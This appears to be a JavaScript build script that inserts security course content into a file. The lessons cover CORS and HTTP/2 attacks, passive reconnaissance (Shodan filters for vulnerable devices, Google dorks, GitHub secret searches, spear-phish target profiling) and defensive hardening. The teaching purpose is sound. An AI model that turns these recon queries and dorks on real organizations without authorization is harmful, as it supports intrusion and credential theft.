# Vulnerable server responds:
Access-Control-Allow-Origin: https://evil.com   # reflected from request
Access-Control-Allow-Credentials: true           # session cookies included
# Browser allows response to be read: attacker reads victim's bank balance

# Null origin vulnerability:
Access-Control-Allow-Origin: null
# Attack: serve from sandboxed iframe (sends Origin: null)</code></pre>

<h3>HTTP/2 Specific Attacks</h3>
<ul>
  <li><strong>H2C upgrade smuggling</strong>: Abusing HTTP/1.1 Upgrade: h2c header to
  establish an unencrypted HTTP/2 connection to a backend that the proxy fails to fully
  inspect — effectively bypassing WAF rules that only process HTTP/1.1.</li>
  <li><strong>Header injection via pseudo-headers</strong>: HTTP/2 uses pseudo-headers
  like <code>:path</code> and <code>:authority</code>. Injecting CRLF sequences into
  these headers can rewrite requests at the backend while the proxy sees clean HTTP/2.</li>
</ul>
\`,
    defense: \`
<h2>Hardening HTTP and HTTPS — The Complete Playbook</h2>

<h3>Security Response Headers — Full Reference</h3>
<pre><code># nginx — complete security header configuration:

# HSTS: Force HTTPS for 1 year, include subdomains, preload-eligible
# WARNING: Only add preload after thorough testing — removal takes months
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# CSP: Start with report-only mode to find violations without breaking the site
add_header Content-Security-Policy-Report-Only "
    default-src 'self';
    script-src 'self' 'nonce-{RANDOM_NONCE}';
    style-src 'self' 'nonce-{RANDOM_NONCE}';
    img-src 'self' data: https:;
    connect-src 'self' https://api.acme.com;
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    report-uri https://csp.acme.com/report
" always;
# Once all violations are resolved: switch to Content-Security-Policy (enforcing)

# Prevent framing (older browsers — modern apps use CSP frame-ancestors):
add_header X-Frame-Options "DENY" always;

# Prevent MIME sniffing (IE/old Chrome executing .jpg as JavaScript):
add_header X-Content-Type-Options "nosniff" always;

# Control Referer header sent on outbound links:
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Disable browser features not needed by your app:
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;</code></pre>

<h3>TLS Configuration Hardening</h3>
<pre><code># nginx TLS hardening:
ssl_protocols TLSv1.2 TLSv1.3;   # Disable TLS 1.0 and 1.1 (POODLE, BEAST)
ssl_prefer_server_ciphers on;

# Prefer ECDHE cipher suites (Perfect Forward Secrecy):
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256';
# NEVER include: RC4, DES, 3DES, MD5, NULL, EXPORT, anon cipher suites

# OCSP Stapling — server attaches revocation status (faster, more private):
ssl_stapling on;
ssl_stapling_verify on;
ssl_trusted_certificate /etc/nginx/ssl/chain.pem;

# Disable session tickets for strict forward secrecy:
ssl_session_tickets off;

# Validate your TLS configuration:
# ssllabs.com/ssltest — aim for A+
# testssl.sh — command-line comprehensive TLS testing</code></pre>

<h3>Removing Version Disclosure Headers</h3>
<pre><code># nginx — hide version from Server header:
server_tokens off;    # "Server: nginx" (no version)

# Apache:
ServerTokens Prod     # "Server: Apache" (no version)
ServerSignature Off   # No Apache version on error pages

# PHP:
# php.ini: expose_php = Off
# Removes X-Powered-By: PHP/x.x.x

# Node.js / Express:
app.disable('x-powered-by');

# Custom error pages — zero technical content:
error_page 404 /errors/404.html;
error_page 500 502 503 504 /errors/50x.html;
# Contents: "Something went wrong." — no stack traces, no versions</code></pre>

<h3>JWT Security — Implementation Requirements</h3>
<pre><code># 1. Algorithm whitelist — never accept alg:none:
import jwt
payload = jwt.decode(
    token,
    secret_key,
    algorithms=["HS256"],  # Whitelist only specific algorithms
    options={"verify_exp": True}
)

# 2. Asymmetric signing for distributed systems (RS256/ES256):
# Auth server signs with private key; services verify with public key at /jwks.json

# 3. Short-lived access tokens + long-lived refresh tokens:
{
    "access_token": "...",   # 15-minute expiry, kept in JS memory
    "refresh_token": "...",  # 7 days, stored in HttpOnly cookie only
    "expires_in": 900
}

# 4. Store JWTs in HttpOnly cookies, NOT localStorage:
# localStorage is readable by any script (XSS steals it instantly)
# HttpOnly cookie: JavaScript cannot read; CSRF mitigated by SameSite=Strict

# 5. Rotate tokens on privilege escalation:
# New token issued when user gains elevated access; old token invalidated</code></pre>

<h3>Cookie Hardening</h3>
<pre><code># __Host- prefix = maximum security:
# Requires: Secure, Path=/, no Domain attribute
# Effect: only sent to the exact host that set it (not subdomains)
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/

# Python (Flask):
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Strict',
    PERMANENT_SESSION_LIFETIME=3600,
)

# Node.js (Express):
app.use(session({
    name: '__Host-sess',
    secret: process.env.SESSION_SECRET,
    cookie: { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 3600000 },
    resave: false,
    saveUninitialized: false
}));</code></pre>

<h3>WAF Deployment — ModSecurity with OWASP CRS</h3>
<pre><code># ModSecurity v3 with nginx:
load_module modules/ngx_http_modsecurity_module.so;
http {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}

# main.conf — OWASP Core Rule Set:
Include /etc/nginx/modsec/modsecurity.conf
Include /usr/share/modsecurity-crs/crs-setup.conf
Include /usr/share/modsecurity-crs/rules/*.conf

# Start in detection mode for tuning:
SecRuleEngine DetectionOnly
# After tuning: SecRuleEngine On

# Rate limiting (nginx, before WAF):
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req zone=api burst=20 nodelay;</code></pre>
\`,
  },

`;

const RECON_BLOCK = `  'passive-recon': {
    concept: \`
<h2>Passive Reconnaissance: Intelligence Without Footprints</h2>

<h3>The Intelligence Advantage</h3>
<p>
  Every successful attack begins not with a port scan, but with intelligence. Passive
  reconnaissance gathers detailed information about a target using entirely public sources —
  leaving no trace in the target's logs, triggering no alerts, and remaining within the
  bounds of publicly accessible information.
</p>
<p>
  The intelligence advantage is asymmetric. A defender must protect every system, every
  employee, every piece of information they have ever published. An attacker needs to find
  only one path. During passive recon, the attacker assembles the full picture from fragments
  scattered across WHOIS records, job postings, GitHub repositories, LinkedIn profiles,
  TLS certificate logs, and search engine caches — before the target has any idea they are
  being studied.
</p>

<blockquote>
  "Give me six hours to chop down a tree and I will spend the first four sharpening the axe."
  This principle is operationalized by every sophisticated threat actor. The Lazarus Group,
  Salt Typhoon, and Scattered Spider invested weeks in passive intelligence gathering before
  executing their attacks.
</blockquote>

<h3>OPSEC in Passive Reconnaissance</h3>
<p>
  The defining characteristic of passive recon is that you <strong>never touch the
  target</strong>. No packets arrive at the target's systems from you. This has three
  critical implications:
</p>
<ul>
  <li><strong>No log entries</strong>: The target's firewalls, IDS, and web servers receive
  nothing. There is nothing to alert on, nothing to investigate, no IP to block.</li>
  <li><strong>Legal clarity</strong>: Accessing public information (WHOIS, crt.sh, Shodan,
  LinkedIn) is not a computer intrusion offense. The CFAA requires unauthorized access to
  a computer — reading public databases requires no such access.</li>
  <li><strong>Patience without cost</strong>: Passive recon can continue for weeks without
  triggering any response. APT groups routinely spend 60–90 days in the intelligence phase.</li>
</ul>

<h3>WHOIS — The Registry of the Internet</h3>
<p>
  WHOIS (RFC 954, 1985) is the original public database of domain registration information.
  For decades it provided complete transparency: registrant name, email, phone, address,
  technical contact, registrar, registration date, expiry, and nameservers.
</p>
<pre><code>whois acme.com

Domain Name: ACME.COM
Registrar: Namecheap, Inc.
Creation Date: 1998-04-03T00:00:00Z    domain age = organization maturity
Updated Date: 2024-01-15T12:34:56Z    recent update = infrastructure change?
Registry Expiry Date: 2025-04-03T00:00:00Z  near expiry = squatting risk?
Registrant Name: REDACTED FOR PRIVACY    GDPR privacy (EU registrant)
Name Server: ns1.acme.com              running own nameservers (more to enumerate)
Name Server: ns2.acme.com</code></pre>

<p>
  <strong>GDPR/CCPA Impact (since May 2018)</strong>: Personal contact data is redacted
  for EU registrants. However, the following is <em>never</em> redacted:
</p>
<ul>
  <li>Nameservers — reveals hosting provider and DNS infrastructure</li>
  <li>Registrar — reveals which registrar (some have weaker processes)</li>
  <li>Registration and expiry dates — domain age, renewal patterns</li>
  <li>Domain status codes — transfer locks, redemption periods</li>
</ul>

<p>
  <strong>RDAP</strong> (Registration Data Access Protocol, RFC 7480) is the modern
  JSON-based replacement for text-based WHOIS, offering structured data and authentication
  for accessing non-public fields.
</p>

<h3>Certificate Transparency — Every Certificate is Public</h3>
<p>
  Since mandatory for Chrome trust since 2018, <strong>every TLS certificate must be
  submitted to at least two public CT logs</strong> before browsers trust it. These logs
  are append-only, cryptographically verifiable, and permanently public. Every subdomain
  that has ever received a TLS certificate from a trusted CA is permanently recorded.
</p>
<pre><code># Query crt.sh for all certs ever issued for acme.com:
https://crt.sh/?q=%.acme.com

Results:
  mail.acme.com       issued 2 years ago, still active
  vpn.acme.com        issued 3 years ago (VPN gateway — prime target)
  dev.acme.com        issued 18 months ago (dev environment, less secure)
  staging.acme.com    issued 18 months ago (may have test credentials)
  jenkins.acme.com    issued 2 years ago (CI/CD — should not be public)
  *.internal.acme.com wildcard for internal subdomains — interesting

# Historical analysis from CT logs:
# Old cert issued to cloudflare.com as SAN
# New cert issued to fastly.net as SAN
# → Company migrated CDN from Cloudflare to Fastly between those dates</code></pre>

<h3>Shodan — The Search Engine for the Internet</h3>
<p>
  Shodan (created by John Matherly, 2009) port-scans the entire internet and indexes the
  service banners — the text servers return when you connect. It crawls every routable IPv4
  address on hundreds of ports, collecting and indexing every banner.
</p>
<pre><code># Shodan filters — finding specific targets:
org:"Acme Corporation"                    # All of Acme Corp's internet exposure
net:203.0.113.0/24                         # Entire subnet scan results
hostname:acme.com                          # IPs with reverse DNS to acme.com
ssl.cert.subject.cn:"acme.com"             # TLS certs with acme.com
product:"Apache httpd" version:"2.4.49"    # Specifically vulnerable Apache
product:"Cisco IOS XE" port:443           # Cisco routers (Salt Typhoon's target)
http.title:"Outlook Web App"              # Exposed OWA servers
http.title:"phpMyAdmin"                   # Exposed database admin panels
has_screenshot:true port:3389            # RDP with screenshots captured
country:US port:22 product:"OpenSSH" version:"7.4"  # Vulnerable SSH</code></pre>

<h3>LinkedIn and Social Media Intelligence</h3>
<p>
  LinkedIn is one of the highest-value passive intelligence sources for targeted attacks.
  The platform is designed to make employees discoverable — from an attacker's perspective,
  it is a gold mine of organizational structure, technology stack, and targeting data.
</p>
<ul>
  <li><strong>Organizational mapping</strong>: Browse employees by department. Build a complete
  org chart. The VP of Infrastructure owns the network. The Director of Cloud Engineering
  owns AWS. Find their email format from WHOIS or hunter.io.</li>
  <li><strong>Technology enumeration from job postings</strong>: "Senior Network Engineer —
  Cisco CCNP required, IOS XE and SD-WAN preferred" reveals the exact network OS.
  "DevOps — Kubernetes EKS, Terraform, GitLab CI/CD" reveals the entire cloud stack.</li>
  <li><strong>Individual targeting for spear phishing</strong>: The engineer who posted about
  Cisco Live 2024, has CCNP certifications, and is titled "Network Security Engineer" is
  the ideal target for a spear phish with subject "Cisco IOS XE Critical Security Advisory."</li>
</ul>

<h3>GitHub OSINT — When Source Code Leaks Secrets</h3>
<p>
  Developers routinely commit sensitive material by accident: API keys, AWS credentials,
  database passwords, private keys, internal URLs. Even after deletion, GitHub's search
  index caches content for months.
</p>
<pre><code># GitHub search queries:
org:AcmeCorp "api_key"
org:AcmeCorp "aws_access_key"
org:AcmeCorp "BEGIN RSA PRIVATE KEY"
org:AcmeCorp filename:.env
org:AcmeCorp "jdbc:mysql"          (database connection strings)
org:AcmeCorp filename:*.pem        (certificate/key files)

# Tools for automated scanning:
trufflehog github --org AcmeCorp --only-verified
gitleaks detect --source /path/to/cloned/repo

# The Uber 2022 breach:
# Attacker found credentials in GitHub repo (via social engineering)
# Credentials led to PAM system → full access to AWS, GCP, internal Slack, repos
# Cost: hundreds of millions in regulatory fines and remediation</code></pre>

<h3>Automated OSINT Tools</h3>
<ul>
  <li><strong>theHarvester</strong>: Collects emails, hostnames, IPs, URLs from Google,
  LinkedIn, Shodan, CertSpotter, VirusTotal. Standard first-run tool.</li>
  <li><strong>SpiderFoot</strong>: 200+ data source modules. Maps relationships between
  domains, IPs, emails, and names into a graph.</li>
  <li><strong>Maltego</strong>: Visual link analysis. Drag entities onto a canvas, run
  transforms, watch the relationship graph grow. Used by law enforcement, threat
  intelligence teams, and penetration testers alike.</li>
</ul>
\`,
    technique: \`
<h2>Passive Recon in Practice — Methodology and Real-World Techniques</h2>

<h3>Salt Typhoon Pre-Attack OSINT — A Case Study</h3>
<p>
  Salt Typhoon (Chinese APT, tracked as Earth Estries and FamousSparrow) compromised
  multiple major US carriers (AT&amp;T, Verizon, Lumen, T-Mobile) in 2023–2024. Before any
  exploit was deployed, the group conducted systematic passive reconnaissance.
</p>
<p>
  The initial vector was <strong>CVE-2023-20198</strong> — a CVSS 10.0 privilege escalation
  in Cisco IOS XE's web UI. Intelligence gathering used Shodan:
</p>
<pre><code># Identifying vulnerable Cisco IOS XE routers:
product:"Cisco IOS XE" port:443   # Tens of thousands of results globally

# Refined to US telecom infrastructure:
product:"Cisco IOS XE" port:443 org:"AT&T" country:US
product:"Cisco IOS XE" port:443 org:"Verizon" country:US

# Shodan banner for a vulnerable device:
# HTTP/1.1 200 OK
# Server: cisco-IOS
# X-Powered-By: IOS/17.3.5      Version 17.3.5 is in the vulnerable range!

# Vulnerable ranges per Cisco advisory:
# IOS XE 17.3.1 through 17.3.8 — all vulnerable
# IOS XE 17.6.1 through 17.6.6 — all vulnerable
# Shodan's version data vs Cisco's advisory = exact target list</code></pre>

<h3>Complete 8-Phase Passive Recon Workflow</h3>

<h4>Phase 1: Domain Registration Intelligence</h4>
<pre><code># WHOIS primary and related domains:
whois acme.com
whois acme.io       (defensive registrations?)
whois acme.net

# RDAP (modern JSON output):
curl https://rdap.org/domain/acme.com | python3 -m json.tool

# Historical WHOIS:
# DomainTools, SecurityTrails — all past registrant data

# Intelligence extracted:
# - NS records: AWS Route 53? Cloudflare? Self-hosted?
# - Registration date: organizational maturity
# - Expiry: domain squatting opportunity?</code></pre>

<h4>Phase 2: Certificate Transparency Sweep</h4>
<pre><code>curl "https://crt.sh/?q=%.acme.com&output=json" | \
    python3 -c "import json,sys; data=json.load(sys.stdin); \
    [print(e['name_value']) for e in data]" | sort -u

# Typical output:
acme.com
mail.acme.com         (mail server)
vpn.acme.com          (VPN gateway — prime target)
api.acme.com          (API server)
dev.acme.com          (dev environment — likely less secure)
staging.acme.com      (may have test credentials)
jenkins.acme.com      (CI/CD — often internet-exposed by accident)
kibana.acme.com       (log analytics — may expose sensitive data if auth missing)</code></pre>

<h4>Phase 3: Shodan and Censys Enumeration</h4>
<pre><code># Shodan CLI:
shodan search org:"Acme Corporation" --fields ip_str,port,hostnames,product

# Results:
203.0.113.25   443   mail.acme.com      Microsoft Exchange
203.0.113.30   443   vpn.acme.com       Cisco AnyConnect
203.0.113.50   443   jenkins.acme.com   Jenkins CI
203.0.113.55  5601   kibana.acme.com    Kibana (no auth found!)

# Detailed host view:
shodan host 203.0.113.50
# OS fingerprint, exact software versions, historical snapshots, open ports</code></pre>

<h4>Phase 4: Google Dorking</h4>
<pre><code># Documents that should not be public:
site:acme.com filetype:xlsx
site:acme.com filetype:csv
site:acme.com filetype:sql          (database dumps)
site:acme.com ext:bak               (backup files)
site:acme.com ext:env               (Laravel/PHP env files)

# Admin and login interfaces:
site:acme.com inurl:admin
site:acme.com inurl:wp-admin
site:acme.com intitle:"phpMyAdmin"

# Information leakage:
site:acme.com intitle:"index of"           (directory listings)
site:acme.com "error in your SQL syntax"   (SQLi-vulnerable pages)
site:acme.com inurl:swagger                (API documentation)

# API artifacts:
site:acme.com inurl:"/api/v"
site:acme.com inurl:".git"                 (exposed git directory = source code!)</code></pre>

<h4>Phase 5: LinkedIn and Social Media Mapping</h4>
<pre><code># Target profile: Sarah Chen, Senior Network Engineer, Acme Corp
# Skills: Cisco, IOS XE, SD-WAN, Palo Alto, Splunk
# Post: "Excited to attend Cisco Live 2024!"
# Certs: CCNP Enterprise, CCIE track

# Intelligence:
# - Network runs on Cisco IOS XE (matches Shodan data)
# - SD-WAN in use
# - SIEM is Splunk
# - Named spear phish target for "Cisco security advisory" themed email

# Job posting analysis:
# "Senior Cloud Security Engineer — AWS, Azure, GCP, Terraform,
#  GitLab CI/CD, Kubernetes EKS/AKS, experience with Wiz preferred"
# Intelligence: multicloud, GitLab for CI/CD, Wiz CSPM
# Next step: find gitlab.acme.com (already found in crt.sh)</code></pre>

<h4>Phase 6: GitHub Repository Search</h4>
<pre><code># Browse github.com/AcmeCorp for public repositories

# Search across repos:
org:AcmeCorp "api_key"
org:AcmeCorp "aws_secret_access_key"
org:AcmeCorp "password" filename:.env
org:AcmeCorp "BEGIN RSA PRIVATE KEY"
org:AcmeCorp "internal.acme.com"   (internal architecture in code)

# Automated:
trufflehog github --org AcmeCorp --only-verified
gitleaks detect --source ./cloned-repo --report-format json</code></pre>

<h4>Phases 7-8: Job Posting Analysis and Threat Intel</h4>
<pre><code># Phase 7: archive job postings (disappear when filled)
# web.archive.org/web/*/acme.com/careers
# Google: site:linkedin.com/jobs "Acme Corporation"

# Phase 8: Threat intelligence feeds
# VirusTotal: has anyone submitted acme.com files or URLs?
# URLhaus: any acme.com URL in abuse feeds? (prior compromise indicator)
# HaveIBeenPwned API: which employee emails are in breach databases?
curl "https://haveibeenpwned.com/api/v3/breachedaccount/sarah.chen@acme.com" \
    -H "hibp-api-key: YOUR_API_KEY"
# Returns: which breaches contain this email (with historically associated passwords)</code></pre>
\`,
    defense: \`
<h2>Defending Against Passive Reconnaissance</h2>
<p>
  You cannot prevent someone from reading public information. But you can dramatically
  reduce the intelligence value of what they find, monitor what an attacker sees about
  you, and detect when passive recon transitions to active probing.
</p>

<h3>Running Recon Against Yourself — Attack Surface Management</h3>
<pre><code># Shodan assessment of your own IP ranges:
shodan search net:203.0.113.0/24 --fields ip_str,port,product,version

# Shodan Monitor (free tier available):
# Alerts within hours when a new port or service appears on your IP ranges
# You should know about new internet-facing services before attackers do

# crt.sh monitoring — detect unauthorized certificates:
# Review weekly: https://crt.sh/?q=%.acme.com
# Any cert you did not authorize = misconfigured system, shadow IT, or hostile issuance

# Enterprise ASM tools:
# - SecurityTrails: DNS history, subdomain monitoring
# - Microsoft Defender EASM: continuous internet-wide scanning
# - Censys Attack Surface Management: continuous scanning of your assets

# Action when unexpected exposure is found:
# 1. Verify it is actually your infrastructure (Shodan data can be stale)
# 2. Determine if the service should be internet-facing
# 3. If not: restrict via firewall immediately
# 4. If yes: verify patching, configuration, and MFA enforcement</code></pre>

<h3>WHOIS Privacy and Domain Security</h3>
<pre><code># Enable WHOIS privacy — hides personal names, emails, phone numbers
# Does NOT hide: nameservers, registrar, dates, status codes

# What attackers still learn from redacted WHOIS:
# - NS records reveal your DNS provider (AWS Route 53? Cloudflare? Self-hosted?)
# - Expiry date reveals squatting opportunity

# Domain security hardening:
# - Enable registry lock (prevents unauthorized transfers)
# - Enable 2FA on your registrar account
# - Auto-renew AND set calendar alerts at 90, 30, 7 days before expiry

# Monitor for typosquatted domains:
pip install dnstwist
dnstwist --registered acme.com   # Find registered variations of your domain</code></pre>

<h3>GitHub Secret Scanning and Repository Hygiene</h3>
<pre><code># Enable GitHub Secret Scanning (free for public repos):
# Settings -> Security -> Code security and analysis -> Secret scanning -> Enable
# GitHub alerts on: AWS keys, GitHub tokens, Slack tokens, Stripe keys,
# private keys (BEGIN RSA PRIVATE KEY), 200+ other patterns

# Pre-commit hooks to prevent secrets reaching the repo:
pip install detect-secrets
detect-secrets scan > .secrets.baseline

# .pre-commit-config.yaml:
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

pip install pre-commit
pre-commit install   # runs on every git commit

# If a secret has ever been committed — even briefly, even if deleted:
# 1. Treat credential as fully compromised immediately
# 2. Rotate it NOW (revoke old, generate new)
# 3. GitHub search indexes deleted content for months
# 4. GitGuardian and similar services have already indexed it
# 5. "I deleted the commit" is NEVER sufficient</code></pre>

<h3>Reducing Information Leakage in Job Postings</h3>
<p>
  Every technical detail in a public job posting is free intelligence for an attacker.
</p>
<ul>
  <li><strong>Never specify version numbers</strong>: "Cisco IOS XE 17.3" tells attackers
  which CVEs apply. Say "Cisco enterprise networking" instead.</li>
  <li><strong>Avoid listing specific security tools</strong>: "Experience with Splunk ES"
  reveals your SIEM. "SIEM experience" does not.</li>
  <li><strong>Do not enumerate your exact cloud footprint</strong>: "AWS EKS, Azure AKS,
  GCP GKE" reveals multicloud strategy. "Cloud container orchestration" is sufficient.</li>
  <li><strong>Review historical job postings</strong>: Use the Wayback Machine to find past
  postings that revealed sensitive details — assess whether that info is still valid.</li>
</ul>

<h3>Error Page Hardening and HTTP Header Hygiene</h3>
<pre><code># nginx — custom error pages (zero technical content):
error_page 400 401 403 404 /errors/4xx.html;
error_page 500 502 503 504 /errors/5xx.html;
# Contents: "Something went wrong. Please try again."
# NOT: "Apache/2.4.49 Server at acme.com Port 443"
# NOT: "MySQL Error: Table 'prod_db.users' doesn't exist"
# NOT: Full Python traceback with file paths and variable values

# Remove version-revealing HTTP headers:
server_tokens off;        # nginx: hides version
# php.ini: expose_php = Off  (removes X-Powered-By: PHP/x.x.x)

# Audit what you are leaking right now:
curl -I https://acme.com
# Review every response header for version numbers and technology disclosure</code></pre>

<h3>Dark Web and Breach Monitoring</h3>
<pre><code># HaveIBeenPwned API:
# Check all employee emails at onboarding
# Domain-level monitoring: alerts when ANY @acme.com appears in new breach

# Commercial monitoring services:
# - SpyCloud: breach data with plaintext passwords (credential stuffing defense)
# - Digital Shadows (ReliaQuest): dark web + paste site monitoring
# - Recorded Future: threat intel with dark web coverage

# Manual paste site monitoring (free starting point):
# Google Alerts for: your domain, executive names, internal codenames
# site:pastebin.com "acme.com"</code></pre>

<h3>Continuous Attack Surface Management Program</h3>
<ul>
  <li><strong>Weekly</strong>: Review crt.sh for new certificate issuances. Unauthorized
  certs indicate shadow IT, misconfiguration, or hostile issuance.</li>
  <li><strong>Weekly</strong>: Run Shodan against your IP ranges. New entries = new
  internet-facing services, intended or not.</li>
  <li><strong>Monthly</strong>: Full theHarvester run. Review what an attacker finds in
  one hour of passive recon today.</li>
  <li><strong>Monthly</strong>: Review public GitHub repos associated with your organization.</li>
  <li><strong>Quarterly</strong>: Review job postings for technology disclosure. Brief HR
  and recruiting on what not to publish.</li>
  <li><strong>On every breach notification</strong>: Run HaveIBeenPwned against all
  employee emails. Reset affected passwords. Assume reuse on corporate accounts.</li>
</ul>
\`,
  },

`;

// ─────────────────────────────────────────────────────────────────────────────
// PERFORM REPLACEMENTS
// ─────────────────────────────────────────────────────────────────────────────

const dnsMarker = "  'dns': {";
const httpMarker = "  'http-https': {";
const reconMarker = "  'passive-recon': {";
const activeMarker = "  'active-recon': {";

// Find positions
const dnsStart = content.indexOf(dnsMarker);
const httpStart = content.indexOf(httpMarker);
const reconStart = content.indexOf(reconMarker);
const activeStart = content.indexOf(activeMarker);

if (dnsStart === -1 || httpStart === -1 || reconStart === -1 || activeStart === -1) {
  throw new Error(`Could not find all markers. dns:${dnsStart} http:${httpStart} recon:${reconStart} active:${activeStart}`);
}

// Build new content by slicing out old blocks and inserting new ones
const before = content.slice(0, dnsStart);
const afterRecon = content.slice(activeStart);

const newContent = before + DNS_BLOCK + HTTP_BLOCK + RECON_BLOCK + afterRecon;

writeFileSync(filePath, newContent, 'utf8');
console.log('Done.');
console.log('New size:', newContent.length, 'chars,', newContent.split('\n').length, 'lines');
